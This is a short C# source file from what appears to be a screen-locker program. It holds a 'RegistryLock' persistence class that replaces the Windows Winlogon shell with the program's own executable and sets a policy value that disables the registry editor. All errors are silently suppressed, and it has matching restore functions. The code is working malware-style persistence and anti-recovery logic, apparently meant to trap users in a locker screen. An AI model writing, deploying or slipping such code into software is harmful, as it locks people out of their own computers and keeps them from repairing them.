namespace ScreenLocker.Persistence;

using Microsoft.Win32;

public static class RegistryLock
{
    private const string ShellOverridePath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
    private const string RunOncePath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";

    private static string? _originalShell;

    public static void SetAsShell()
    {
        string? exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
            return;

        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(ShellOverridePath, true);
            if (key is null) return;

            _originalShell = key.GetValue("Shell")?.ToString() ?? "explorer.exe";
            key.SetValue("Shell", exePath);
        }
        catch { }
    }

    public static void RestoreShell()
    {
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(ShellOverridePath, true);
            key?.SetValue("Shell", _originalShell ?? "explorer.exe");
        }
        catch { }
    }

    public static void DisableRegistryEditor()
    {
        try
        {
            using var key = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            key?.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }
        catch { }
    }

    public static void EnableRegistryEditor()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            key?.DeleteValue("DisableRegistryTools", false);
        }
        catch { }
    }
}
